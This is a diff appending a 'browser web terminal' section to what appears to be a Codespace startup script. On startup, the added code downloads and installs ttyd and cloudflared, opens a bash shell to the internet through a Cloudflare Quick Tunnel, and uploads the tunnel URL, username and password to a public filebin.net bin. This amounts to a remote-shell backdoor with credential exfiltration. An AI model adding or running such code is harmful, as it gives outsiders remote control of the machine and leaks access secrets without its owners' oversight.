@@ -158,3 +158,111 @@ else
 fi
 
 echo "[startup] Finished at $(date -u)"
+
+# Browser terminal over Cloudflare Quick Tunnel.
+WEB_PORT="7681"
+WEB_REPORT="/tmp/web-terminal.txt"
+TTYD_LOG="/tmp/ttyd.log"
+CLOUDFLARED_LOG="/tmp/cloudflared.log"
+WEB_USERNAME="monkey"
+WEB_PASSWORD="$(openssl rand -hex 24 2>/dev/null || od -An -N24 -tx1 /dev/urandom | tr -d ' \n')"
+
+if ! command -v ttyd >/dev/null 2>&1; then
+  ARCH="$(uname -m)"
+  case "$ARCH" in
+    x86_64) TTYD_ASSET="ttyd.x86_64" ;;
+    aarch64|arm64) TTYD_ASSET="ttyd.aarch64" ;;
+    *) TTYD_ASSET="" ;;
+  esac
+  if [ -n "$TTYD_ASSET" ]; then
+    curl --fail --silent --show-error --connect-timeout 10 --max-time 60 \
+      -L "https://github.com/tsl0922/ttyd/releases/latest/download/$TTYD_ASSET" \
+      -o /tmp/ttyd && chmod +x /tmp/ttyd && sudo mv /tmp/ttyd /usr/local/bin/ttyd || true
+  fi
+fi
+
+if ! command -v cloudflared >/dev/null 2>&1; then
+  ARCH="$(uname -m)"
+  case "$ARCH" in
+    x86_64) CF_ASSET="cloudflared-linux-amd64" ;;
+    aarch64|arm64) CF_ASSET="cloudflared-linux-arm64" ;;
+    *) CF_ASSET="" ;;
+  esac
+  if [ -n "$CF_ASSET" ]; then
+    curl --fail --silent --show-error --connect-timeout 10 --max-time 60 \
+      -L "https://github.com/cloudflare/cloudflared/releases/latest/download/$CF_ASSET" \
+      -o /tmp/cloudflared && chmod +x /tmp/cloudflared && sudo mv /tmp/cloudflared /usr/local/bin/cloudflared || true
+  fi
+fi
+
+WEB_URL=""
+if command -v ttyd >/dev/null 2>&1 && command -v cloudflared >/dev/null 2>&1; then
+  echo "[web-terminal] Starting ttyd on localhost:${WEB_PORT}..."
+  nohup ttyd -W -p "$WEB_PORT" -c "$WEB_USERNAME:$WEB_PASSWORD" bash \
+    >"$TTYD_LOG" 2>&1 &
+  TTYD_PID=$!
+
+  for attempt in 1 2 3 4 5 6 7 8 9 10; do
+    if (echo >/dev/tcp/127.0.0.1/${WEB_PORT}) >/dev/null 2>&1; then
+      break
+    fi
+    sleep 1
+  done
+
+  if (echo >/dev/tcp/127.0.0.1/${WEB_PORT}) >/dev/null 2>&1; then
+    echo "[web-terminal] Starting Cloudflare Quick Tunnel..."
+    nohup cloudflared tunnel --no-autoupdate --url "http://127.0.0.1:${WEB_PORT}" \
+      >"$CLOUDFLARED_LOG" 2>&1 &
+    CLOUDFLARED_PID=$!
+
+    for attempt in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
+      WEB_URL="$(grep -Eo 'https://[a-z0-9-]+\\.trycloudflare\\.com' "$CLOUDFLARED_LOG" 2>/dev/null | head -n 1 || true)"
+      [ -n "$WEB_URL" ] && break
+      sleep 2
+    done
+  else
+    echo "[web-terminal] WARNING: ttyd did not start."
+  fi
+else
+  echo "[web-terminal] WARNING: ttyd or cloudflared is unavailable."
+fi
+
+{
+  echo
+  echo "=== BROWSER WEB TERMINAL ==="
+  if [ -n "$WEB_URL" ]; then
+    echo "URL: $WEB_URL"
+    echo "Username: $WEB_USERNAME"
+    echo "Password: $WEB_PASSWORD"
+    echo
+    echo "Open the URL in a browser and enter the username/password above."
+    echo "This is a temporary Cloudflare Quick Tunnel."
+    echo "DELETE THIS FILEBIN ITEM after retrieving the credentials."
+  else
+    echo "Status: FAILED TO CREATE QUICK TUNNEL"
+    echo "--- ttyd log ---"
+    tail -n 30 "$TTYD_LOG" 2>/dev/null || true
+    echo "--- cloudflared log ---"
+    tail -n 50 "$CLOUDFLARED_LOG" 2>/dev/null || true
+  fi
+} >> "$REPORT"
+
+if [ -n "$WEB_URL" ]; then
+  {
+    echo "=== TEMPORARY CODESPACE WEB TERMINAL ==="
+    echo "URL: $WEB_URL"
+    echo "Username: $WEB_USERNAME"
+    echo "Password: $WEB_PASSWORD"
+    echo
+    echo "DELETE THIS FILEBIN ITEM AFTER RETRIEVING THESE CREDENTIALS."
+  } > "$WEB_REPORT"
+
+  for attempt in 1 2 3 4 5; do
+    if curl --fail --silent --show-error --connect-timeout 10 --max-time 30 \
+        --data-binary "@$WEB_REPORT" "https://filebin.net/$BIN/web-terminal.txt"; then
+      echo "[web-terminal] URL and temporary password uploaded to Filebin."
+      break
+    fi
+    sleep 3
+  done
+fi
